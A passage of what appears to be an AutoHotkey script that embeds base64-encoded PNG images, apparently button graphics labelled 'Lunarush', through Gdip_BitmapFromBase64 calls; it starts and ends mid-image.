hD2DCzq+YcbifngVIdlH+kCIoGJBaDopzBoK6HGHCsix5rfWvj4LR+uBxGLU3udhqnOpKU/wvS107D8dBW2P1HBYCj9rQyIKYdF6e6Yu1rY5CvnSBQma+7wLyJwjztleoDxc1uWiwlS9VN2UvonqFogOJtlAxyHiVzzlFceX/1gAeuRFOCN2cUjbODJKUc15K9FxdntERk85KQGN7x7jZAqk700GFva4MNFDXc4uorSNvUHCNevfMVsMKgeCNNZFFByRPKi1FWNXM6PXaAxCo8L3OF9V8NkPWGAT931CP7x+Gw5F9FXtQ0WK4eU8blZ6HwyjlkX7iAvORzsBZcoefp+LnfIWlw7WJIHGKOgFgJz+lw6lkdYtrrJairr+hwczYl9UPUU/4aiNDXB2nOpSxVGNQa3pnkTTeuwLOpHGBQ6aNKAmLl/UTfKEGJboect12xnyYRH9QQlsvhiJ/xGLZTHrpxSgGVu3MeIp9xxWoqIrk9SfmYVi15HAuShj1YDOq4X2lI5/vq8PtUA9KDXZDYU4dzf1FA5Yyhuuo7arwTemL1FH/NuZSlCoMSSQSGQ4pBXfwzfWPUvqQFU9uyxQ7SITpBf/pGWyPnLVccfkrJH6emPortI9phMRWY37Z0x81EBdThJfOxgCpzFUgcAXEExTmJE7U9pNPPE5AZvJvgjhtjCfBQnby/HspNtg7Wz6m1udgLhZ96ac6lLFUcFO9pc1hQ/IuYxkohydsmrHOU5JP7wRrTBJbNPsim5H2YkveSekrlrWohQUl8l3pB00UKzxTETO+ALVShMxBe5k8NqKmAsmQjaWgz+fzBx0smbxXU79MNuDnRIF10Yzy5iOBYFrvh2iiXuweUZakbrN/UhthBFi+S6cs6KJzngQv9jYimcFtGHb89JNZqnxpInE29oDkL5rTT2B/ohu2NCVJzIxJGNoIpZSV9BiX282E4+icPmZtiO7uUAsVK6qWEX84EPSxhyibg3QXqWBuY5lDn/hm1DHRy5kWuSA7SyxP/xU+PLxpRnVTUwzkqsoUrUsKnStdYCvORm3QCvyecQE5iHEyZSRTWBeS2ZGSs7IIoymW/auQmeyUP1qFwpm2n9O4AdWq08m3TiiJBrXDDDSoiz/YhQF112EQhpAVH1WZ6fd/TdSmnbZCg7EsCKQo3kRWP7G3+OECO5HylBUcVr3a8+adCUkFlja5uULuHKxMkUAXTjMiZqJcrzT6qYXgXUguOqk/reWJ7E1fse6YpNdPx8jim72fBfHqXAsmcjfxDY5H+lgcOPKqXFbwWHHtd7E9ummtzkwqq8D16jvep7gZQ3JJc7O8itzq+aeguN920ALE+otcYEifmky8/qByDFNPeiKtveMOalkDhdgk5ax6Ty/ztnKSKQVnCbZBY+e8YYV5IKSGaFpvqApW46kmqow5IUHm02pwnN/Fu45eUoLUAsThXMSBVInuRAuraTPk4+hGug2jFYldRy5P1oS8SCJYWGEcxKNMSJU9yGsifrPxqI0EdbgZrbAAuvVNbcy5lqcKguMoV57dSPdUDuQtq4gwlb9701wLE+oRKg220oqmQoh/RF7vJFDnI9nxbAzI2MkCGtRvZ4Q/LPSYtOPZiUFmUuE3vu8pUoP60xSsyg7LEBGDu8Dvv95wDKu4lCpPLMG2oL5fmW4Hird3visJNVdrmgGJQF8c8XuK1A508IE4sk7CsuUeQvay1TNZagFQxKK6hGJAqmZ++rw+RMrD6QHGDmbarBy3hhTBv9cFvQ/S3BGUPgXWwW03knTsqIRUmb8CP3eqVGnNi/MMwX6fQls6KRPYif2S+9zQuT2qJc4MMsshkeIl8H6jDpYE6pL9WEpRpPrnpxxZy9yBrYR28PfxZzbmUpQqDYvHWhbx2IK4jcucov7c5Qlrp7VECQEQzV1xYMEAWmcKSg99WDJMFpvo694JcfbMyFrakhrio8ZaiEqLgJMTaxtI956gUuRJExeaLipvyJpKLqFRRQYlvvSg9PC/70H2T22jO4XZyHijeuEtbQ5V5LfzSTYdVDqXBRodfU/Z08IL56irFTVcv4OcuyutcfPIKZ9/HsWOuzaOWiK8zkHUWhyoB+8ZXgkklSJzsU4fpcJ3qJd7+tXxCiZwgWZeRm7Y1V358XeeNfSEtNOdwOzkFFEv8nfqxzPUQ+x5GLhV86x+w7X9/RL0c/wRlDyqxnzdy46Klrm3pgT0tDYgjwPb5xl5nX9LBvIMa7ss7IFL3w7QjCOkjyUGvEpwQanrpPusNFwUOFZZ8sYd5MeWmb+i8kshNVzfTc+6a514eOQ0Ub9yLE9PkBROm+a6IDXAtblk+9/EsAclxN7I84lyUO0upuM20gmWEuEg3MaT0YB2yR+slJL7ixUQFJ1/wITb9gVY6atKzF1P+DMbyORM1z708choo+XPVZh86qQiI/U2Q+bYRu1oZNUHdqqEtS+yYPK6J6LhplKwZErdK0lFF4cZXvFipEbdyofnPWlTbEaQUWpXzD8H0j7boNVD73Msjp4FijR/1MkQC1T7X5sK8uT4uD9NjF4UUO0vNUdz5cw+oBcNRXDexUij35PyNL9pwwZXhCiRWxmsuxeHGkMRmchAnbsqTItaXwnQUJf3jsPzwJD56N1TznMsrp4Lii7j4+iRxYTo1y+NgDveg1UiPyNZGuW3CoPa3N2hC0dLZ3jZxIcs7Eby68SYcb8bx6qaGm9zWYUibaitOSn6DEvhGarEeQ9L8Fhj518Ga51xeORUUS16ksYoKxfNTIE4OhoXaiFSCtaelsvTfCSh7cb/HbuKft7hVYkAycX/mRuFGxeRqTwo3StwMiS/6yI+F2NVB9nl9B1f8Kjyng2LJy36W0wqV0F3+9s/OSiFYfOFXDIGKd4DA9Y+92EHn+7rIBjtzpCIVjBStaAUzGZI7LCsJ0AZyEuckvjaUnUSQrP95CmfmNEDvAXf+Q4KWKgUUq/+QIHkxlzjViZwVAAvVMpk0wUsDlPyiXizG+p3CyF6cpEuAcRQldC4oWeYlFHa8uslwo5wkw62DhDQyuK/muf0vqjRQLHlpIofhUWofLvWGlVbDG7OU/Wxe0jUhlFNcgvCli2IdOYlLALm6xcmcVEAgew+sWE5yVKWCYnHO2jKrE1I3PAhx/Dkq/vwhIh9C/oeeyJqgl8qepEch1UjllfiyhpK4DzYht3ajnDSDvojtyNzaCfun/xF9B72seS4VUaWDUjVixDCq3qm+2UPtxMmnIM72pHqrPUGj2qtog61MrSZn8lgWN7iyd1sDcX0bzLtHoXBuLUyZ1F/zs52hKgPF4qJ0ysh+cjNNHCFgidQj8s9cfDUe55iyxOHFbuTxLH7v6tqU2GtgxdxJVExW7r99VCkoe60L7SyV+kF9mLc1hTk6QO4+igu9NMWv8RhW1tqm2DenI/aG+moeuzJUbaBUTQh6UW6ksZKn1EbhJ7U0lfx+Y7w/pa/UlHEvaR6rMlXtoP5fdB9UOXUfVDl1H1Q5dR9UOXUfVDlVZaAC+wxA9+f7oGvgi3jaL7BY/Jif59e13ne3qMpAMQyfZlMQhZK3qEnN8HgnPwlMC5Y94OqEWmWgeJL1G72FSJzDssC6aNrCFzXHMbYojPNuKGExBMf32QBfwIoXmkkXao2rbFUZKJ5gHe+J2Emglvp5wusPdWF0G6M89q+NVm3bFzvLPjTbd+wk36cC5nH8nP2YW7nRmaoyUE907o6adcYjAmcR1lUHnY40OgI4uxR+bp7SYXV6fkY4bLeoiY3le3YWPZa3yLHwqtsTK84XPabbrrdbVzqsagBld4sYDQ/PmlJunmPJNcRhvDdatGwNr2fDCZriPp1udDFgOXYMjYyaIMe1efQJ6apbha6zVH2O6hpGf0UglNwkJ++3lB5HItTTCw0aN5ViHhEhhtKgeiyjR2TGZQHSiQyLxa7S+mxnqPpAUeh1DTtLkdcDrm5uMBSBCzEYil0WQjEXMZrHlgRVz6ehBOS3VAnUyHF1pbvYWVqf7QxVKyiDIUQm87CuqmsUMAzD2E1x2GjOZcWgFIgqKL5nWOysewYUT8J+1avr3UDKfzm5ghJ6N6NbERz1pqxyPEZ1l7xxMh9vX41FYYxX7Xsn9HgSvKzzN8/iZZ7FE2R3qHmJ/7Yfw/f8nPq8Wh5w8ub3qq/fM8mcJ8Gu4kmqE1XFE7YHp0od6yh+j7rS8WMee8+UB1qtiCp+zBN3VHnHsaq84LydJk+ffc9La96sYlDlUWCfgfe8tOataAj+CzZ76S7CepXXAAAAAElFTkSuQmCC")
A_Args.PNG.Lunarush     := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.HLunarush    := Gdip_BitmapFromBase64(0,1,Data.PNG "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